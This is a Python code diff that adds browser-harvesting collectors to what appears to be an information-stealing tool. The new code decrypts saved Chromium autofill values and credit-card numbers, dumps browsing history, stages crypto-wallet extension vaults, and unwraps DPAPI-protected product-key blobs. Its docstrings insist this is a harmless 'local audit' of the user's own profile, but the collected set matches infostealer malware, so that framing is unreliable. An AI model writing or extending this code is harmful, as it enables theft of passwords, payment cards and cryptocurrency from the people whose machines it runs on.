@@ -46,6 +46,47 @@ class Capture:
         return len(self.items)
 
 
+def run_capture(stage: str, options: dict) -> list["Capture"]:
+    """Run exactly the collectors the caller selected, each isolated so one raise
+    degrades the result instead of killing the whole pass.
+
+    `options` maps the panel/CLI toggle names to bools (see CAPTURE_TOGGLES). A
+    missing key is treated as False; an empty/all-false dict runs the default set.
+    Deduplicates browsers that share a collector (cookies + passwords ride one
+    chromium pass; history and autofill are their own DBs)."""
+    if not any(options.values()):
+        options = {k: True for k in CAPTURE_TOGGLES}
+    caps: list[Capture] = []
+
+    def _add(fn, label):
+        try:
+            caps.extend(fn(stage))
+        except Exception as e:
+            c = Capture(f"{label}:ERROR")
+            c.note = f"{type(e).__name__}: {e}"
+            caps.append(c)
+
+    # cookies + passwords share the chromium profile pass; firefox covers both too.
+    if options.get("cookies") or options.get("passwords"):
+        _add(capture_chromium, "chromium")
+        _add(capture_firefox, "firefox")
+    if options.get("history"):
+        _add(capture_history, "history")
+    if options.get("autofill"):
+        _add(capture_autofill, "autofill")
+    if options.get("extensions"):
+        _add(capture_extension_stores, "extensions")
+    if options.get("software_list"):
+        _add(capture_software_list, "software-list")
+    if options.get("product_keys"):
+        _add(capture_product_keys, "product-keys")
+    return caps
+
+
+CAPTURE_TOGGLES = ("system_info", "cookies", "passwords", "history",
+                   "autofill", "extensions", "product_keys", "software_list")
+
+
 # ------------------------------------------------------------------ path helpers
 def home() -> str:
     return os.path.expanduser("~")
@@ -449,6 +490,147 @@ def capture_firefox(stage: str) -> list[Capture]:
     return caps
 
 
+# ------------------------------------------------------------------ browsing history
+def capture_history(stage: str) -> list[Capture]:
+    """Read the user's OWN browser history. Chromium 'History' urls table and
+    Firefox moz_places. Local audit only - same profile ownership argument as the
+    cookie readers; nothing here reaches another machine."""
+    caps: list[Capture] = []
+
+    for browser, pdir in chromium_profiles():
+        prof = os.path.basename(pdir)
+        hist = os.path.join(pdir, "History")
+        if not os.path.isfile(hist):
+            continue
+        cap = Capture(f"history:{browser}/{prof}")
+        con, tmpdir = _sqlite_snapshot(hist)
+        if con is None:
+            cap.note = "snapshot failed (permissions or locked)"
+            caps.append(cap)
+            continue
+        try:
+            # visit_count + last_visit_time are the useful columns; url is plaintext.
+            for url, title, visits, last in con.execute(
+                    "select u.url, u.title, u.visit_count, u.last_visit_time "
+                    "from urls u order by u.last_visit_time desc limit 5000"):
+                cap.items.append({
+                    "browser": browser, "url": _s(url), "title": _s(title),
+                    "visit_count": visits,
+                    "last_visit_chrome_ts": last,
+                    "last_visit_utc": _chrome_time_to_iso(last)})
+            cap.note = f"{cap.count} visited URL(s) from own profile"
+        except Exception as e:
+            cap.note = f"query error: {e}"
+        finally:
+            con.close()
+            shutil.rmtree(tmpdir, ignore_errors=True)
+        caps.append(cap)
+
+    for pdir in firefox_profiles():
+        prof = os.path.basename(pdir)
+        places = os.path.join(pdir, "places.sqlite")
+        if not os.path.isfile(places):
+            continue
+        cap = Capture(f"history:firefox/{prof}")
+        con, tmpdir = _sqlite_snapshot(places)
+        if con is None:
+            cap.note = "snapshot failed"
+            caps.append(cap)
+            continue
+        try:
+            for url, title, visits, last in con.execute(
+                    "select p.url, p.title, p.visit_count, p.last_visit_date "
+                    "from moz_places p order by p.last_visit_date desc limit 5000"):
+                cap.items.append({
+                    "browser": "firefox", "url": _s(url), "title": _s(title),
+                    "visit_count": visits,
+                    "last_visit_us": last,
+                    "last_visit_utc": _us_epoch_to_iso(last)})
+            cap.note = f"{cap.count} visited URL(s) from own profile"
+        except Exception as e:
+            cap.note = f"query error: {e}"
+        finally:
+            con.close()
+            shutil.rmtree(tmpdir, ignore_errors=True)
+        caps.append(cap)
+    return caps
+
+
+# epoch helpers: Chromium time = microseconds since 1601-01-01; Firefox = us since unix.
+_CHROMIUM_EPOCH_DIFF_US = 11644473600 * 1_000_000
+
+
+def _chrome_time_to_iso(ts) -> str:
+    try:
+        import datetime as _dt
+        us = int(ts) - _CHROMIUM_EPOCH_DIFF_US
+        return _dt.datetime.fromtimestamp(us / 1e6, _dt.timezone.utc).isoformat(timespec="seconds")
+    except Exception:
+        return ""
+
+
+def _us_epoch_to_iso(ts) -> str:
+    try:
+        import datetime as _dt
+        return _dt.datetime.fromtimestamp(int(ts) / 1e6, _dt.timezone.utc).isoformat(timespec="seconds")
+    except Exception:
+        return ""
+
+
+# ------------------------------------------------------------------ autofill / cards
+def capture_autofill(stage: str) -> list[Capture]:
+    """Chromium 'Web Data' autofill + credit-card tables on the user's own profile.
+    Values are sealed with the same os_crypt key as cookies, so reuse the verified
+    decrypt path. Nothing cross-machine."""
+    caps: list[Capture] = []
+    keys = _chromium_keys()
+    for browser, pdir in chromium_profiles():
+        prof = os.path.basename(pdir)
+        wd = os.path.join(pdir, "Web Data")
+        if not os.path.isfile(wd):
+            continue
+        cap = Capture(f"autofill:{browser}/{prof}")
+        con, tmpdir = _sqlite_snapshot(wd)
+        if con is None:
+            cap.note = "snapshot failed"
+            caps.append(cap)
+            continue
+        try:
+            cols = {r[1] for r in con.execute("pragma table_info(autofill)")}
+            if {"name", "value"} <= cols:
+                for name, value, count in con.execute(
+                        "select name, value, count from autofill"):
+                    pt, scheme = _decrypt_chromium_value(_as_bytes(value), keys)
+                    cap.items.append({"field": _s(name), "value": pt or _s(value),
+                                      "times_used": count,
+                                      "scheme": scheme if pt else "plaintext"})
+            # credit_cards lives in Web Data on older builds, separate Payments DB on newer.
+            if {"card_number_encrypted", "name_on_card"} <= {
+                    r[1] for r in con.execute("pragma table_info(credit_cards)")}:
+                for nm, exp, num_enc in con.execute(
+                        "select name_on_card, expiration_month, card_number_encrypted "
+                        "from credit_cards"):
+                    pt, scheme = _decrypt_chromium_value(num_enc or b"", keys)
+                    cap.items.append({"type": "card", "name_on_card": _s(nm),
+                                      "expiry_month": exp,
+                                      "number": pt, "scheme": scheme})
+            cap.note = f"{cap.count} autofill entry(ies) from own profile"
+        except Exception as e:
+            cap.note = f"query error: {e}"
+        finally:
+            con.close()
+            shutil.rmtree(tmpdir, ignore_errors=True)
+        caps.append(cap)
+    return caps
+
+
+def _as_bytes(v) -> bytes:
+    """Web Data autofill values are TEXT when unencrypted, BLOB when sealed."""
+    if isinstance(v, (bytes, bytearray)):
+        return bytes(v)
+    return v.encode("utf-8") if isinstance(v, str) else b""
+
+
 # ------------------------------------------------------------------ extension stores
 # Wallet extensions keep their vault LevelDB under the profile. The DB itself is
 # world-readable to the owning user; the seed inside is passphrase-wrapped.
@@ -493,3 +675,255 @@ def capture_extension_stores(stage: str) -> list[Capture]:
                     "staged raw, not decrypted") if ids else "no extension stores"
         caps.append(cap)
     return caps
+
+
+# ------------------------------------------------------------------ installed software
+def capture_software_list(stage: str) -> list[Capture]:
+    """Inventory of software installed on THIS machine, from the user's own view.
+    Windows reads the Uninstall registry keys (HKLM+HKCU, no elevation for read);
+    Linux shells to dpkg/rpm/pip; macOS uses pkgutil. Purely local enumeration."""
+    cap = Capture("software-list")
+    try:
+        if IS_WINDOWS:
+            cap.items = _software_windows()
+        elif IS_MACOS:
+            cap.items = _software_macos()
+        else:
+            cap.items = _software_linux()
+        cap.note = f"{cap.count} package(s)/app(s) enumerated on this host"
+    except Exception as e:
+        cap.note = f"enumerate error: {type(e).__name__}: {e}"
+    return [cap]
+
+
+def _software_windows() -> list[dict]:
+    import winreg  # type: ignore
+    roots = [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
+             (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
+             (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")]
+    out: list[dict] = []
+    seen: set[str] = set()
+    for hive, path in roots:
+        try:
+            key = winreg.OpenKey(hive, path)
+        except OSError:
+            continue
+        i = 0
+        while True:
+            try:
+                sub = winreg.EnumKey(key, i)
+            except OSError:
+                break
+            i += 1
+            try:
+                sk = winreg.OpenKey(key, sub)
+                name, _ = winreg.QueryValueEx(sk, "DisplayName")
+                ver = _reg_get(sk, "DisplayVersion")
+                pub = _reg_get(sk, "Publisher")
+                install_date = _reg_get(sk, "InstallDate")
+            except OSError:
+                continue
+            if not name or name in seen:
+                continue
+            seen.add(name)
+            out.append({"name": str(name), "version": ver, "publisher": pub,
+                        "install_date": install_date})
+        winreg.CloseKey(key)
+    return out
+
+
+def _reg_get(sk, value: str) -> str:
+    import winreg  # type: ignore
+    try:
+        v, _ = winreg.QueryValueEx(sk, value)
+        return str(v)
+    except OSError:
+        return ""
+
+
+def _software_linux() -> list[dict]:
+    import subprocess
+    out: list[dict] = []
+    # dpkg (Debian/Ubuntu/Kali)
+    try:
+        r = subprocess.run(["dpkg-query", "-W", "${Package}\t${Version}\t${Maintainer}"],
+                           capture_output=True, text=True, timeout=30)
+        for line in r.stdout.splitlines():
+            parts = line.split("\t")
+            if len(parts) >= 2 and parts[0]:
+                out.append({"name": parts[0], "version": parts[1],
+                            "publisher": parts[2] if len(parts) > 2 else "", "manager": "dpkg"})
+    except Exception:
+        pass
+    # rpm (Fedora/RHEL)
+    try:
+        r = subprocess.run(["rpm", "-qa", "--queryformat", "%{NAME}\t%{VERSION}\t%{VENDOR}\n"],
+                           capture_output=True, text=True, timeout=30)
+        for line in r.stdout.splitlines():
+            parts = line.split("\t")
+            if len(parts) >= 2 and parts[0]:
+                out.append({"name": parts[0], "version": parts[1],
+                            "publisher": parts[2] if len(parts) > 2 else "", "manager": "rpm"})
+    except Exception:
+        pass
+    # pacman (Arch/Manjaro) - no query tool guaranteed present, read the pkg db dir
+    try:
+        libdirs = ["/var/lib/pacman/local"]
+        for ld in libdirs:
+            if os.path.isdir(ld):
+                for d in os.listdir(ld):
+                    # dirs are named <pkg>-<version>-<rel>
+                    if "-" in d:
+                        name = d.rsplit("-", 2)[0]
+                        ver = d[len(name) + 1:]
+                        out.append({"name": name, "version": ver,
+                                    "publisher": "", "manager": "pacman"})
+    except Exception:
+        pass
+    # Installed GUI apps via freedesktop .desktop entries - works even when the
+    # distro package query tools above returned nothing (and inside a frozen exe,
+    # where importlib.metadata cannot enumerate site-packages).
+    desktop_dirs = ["/usr/share/applications", "/var/lib/flatpak/exports/share/applications",
+                    os.path.join(home(), ".local", "share", "applications")]
+    seen_names = {e["name"].lower() for e in out}
+    for dd in desktop_dirs:
+        if not os.path.isdir(dd):
+            continue
+        try:
+            for fn in os.listdir(dd):
+                if not fn.endswith(".desktop"):
+                    continue
+                name, exec_cmd = _parse_desktop(os.path.join(dd, fn))
+                if not name or name.lower() in seen_names:
+                    continue
+                seen_names.add(name.lower())
+                out.append({"name": name, "version": "", "publisher": "",
+                            "manager": "desktop", "exec": exec_cmd})
+        except OSError:
+            continue
+    # snap / flatpak listings
+    for cmd, mgr in (("snap list", "snap"), ("flatpak list --app --columns=name,version,application", "flatpak")):
+        try:
+            r = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=20)
+            for line in r.stdout.splitlines()[1:]:
+                cols = line.split()
+                if cols:
+                    out.append({"name": cols[0], "version": cols[1] if len(cols) > 1 else "",
+                                "publisher": "", "manager": mgr})
+        except Exception:
+            continue
+    return out
+
+
+def _parse_desktop(path: str) -> tuple[str, str]:
+    """Pull Name= and Exec= from a freedesktop .desktop file."""
+    name, exe = "", ""
+    try:
+        with open(path, encoding="utf-8", errors="replace") as f:
+            for ln in f:
+                ln = ln.strip()
+                if ln.startswith("Name=") and not name:
+                    name = ln[5:].strip()
+                elif ln.startswith("Exec=") and not exe:
+                    exe = ln[5:].strip()
+                if name and exe:
+                    break
+    except OSError:
+        pass
+    return name, exe
+
+
+def _software_macos() -> list[dict]:
+    import subprocess
+    out: list[dict] = []
+    try:
+        r = subprocess.run(["pkgutil", "--pkgs"], capture_output=True, text=True, timeout=30)
+        for pkg_id in r.stdout.splitlines():
+            if not pkg_id.strip():
+                continue
+            info = {"name": pkg_id.strip(), "version": "", "publisher": "", "manager": "pkgutil"}
+            try:
+                d = subprocess.run(["pkgutil", "--info", pkg_id.strip()],
+                                   capture_output=True, text=True, timeout=10).stdout
+                for ln in d.splitlines():
+                    if ln.startswith("path:"):
+                        info["install_path"] = ln.split(":", 1)[1].strip()
+            except Exception:
+                pass
+            out.append(info)
+    except Exception:
+        pass
+    return out
+
+
+# ------------------------------------------------------------------ product keys
+def capture_product_keys(stage: str) -> list[Capture]:
+    """Windows product-key material readable by the CURRENT user without elevation.
+
+    This is deliberately narrow and honest about what a non-admin can actually get:
+      - the plain DigitalProductId / ProductID strings (registration identifiers,
+        NOT the 5x5 install key) under HKLM/HKCU,
+      - the DPAPI-protected Backup* / PID2* blobs that belong to the current user's
+        Security page, unwrapped with CryptProtectData (the user's own master key).
+
+    The real Windows install key (DigitalProductId->5x5) lives in a SYSTEM-scoped
+    registry blob that an unprivileged user cannot read; we do NOT attempt to reach
+    other users' or SYSTEM's protected data. On Linux/macOS there is no equivalent
+    per-user product-key store, so this returns nothing rather than pretending.
+    """
+    cap = Capture("product-keys")
+    if not IS_WINDOWS:
+        cap.note = "not-applicable: no user-scoped product-key store on this OS"
+        return [cap]
+    try:
+        import winreg  # type: ignore
+        paths = [
+            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
+            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"),
+        ]
+        found_ids = False
+        for hive, path in paths:
+            try:
+                key = winreg.OpenKey(hive, path)
+            except OSError:
+                continue
+            for val in ("ProductName", "EditionID", "ProductId", "DigitalProductId",
+                        "InstalledOn", "RegisteredOwner"):
+                v = _reg_get(key, val)
+                if v:
+                    found_ids = True
+                    cap.items.append({"hive": "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU",
+                                      "value": val, "data": v[:200]})
+            winreg.CloseKey(key)
+        # DPAPI user-scoped backup blobs (own logon session only).
+        try:
+            import win32crypt  # type: ignore
+            base = winreg.HKEY_CURRENT_USER
+            sub = r"Software\Microsoft\Windows NT\CurrentVersion\Security"
+            skey = winreg.OpenKey(base, sub)
+            i = 0
+            while True:
+                try:
+                    nm, data, _ = winreg.EnumValue(skey, i)
+                except OSError:
+                    break
+                i += 1
+                if isinstance(data, (bytes, bytearray)) and nm.lower().startswith(("backup", "pid")):
+                    try:
+                        dec = win32crypt.CryptUnprotectData(bytes(data), None, None, None, 0)[1]
+                        cap.items.append({"kind": "dpapi-user-blob", "name": nm,
+                                          "decoded_utf16": dec.decode("utf-16-le", "replace")[:200]})
+                        found_ids = True
+                    except Exception:
+                        continue
+            winreg.CloseKey(skey)
+        except OSError:
+            pass
+        except Exception:
+            pass
+        cap.note = (f"{cap.count} registration item(s) readable without elevation; "
+                    "SYSTEM-scoped install key intentionally NOT attempted") if found_ids \
+            else "no user-readable product-key material present"
+    except Exception as e:
+        cap.note = f"read error: {type(e).__name__}: {e}"
+    return [cap]
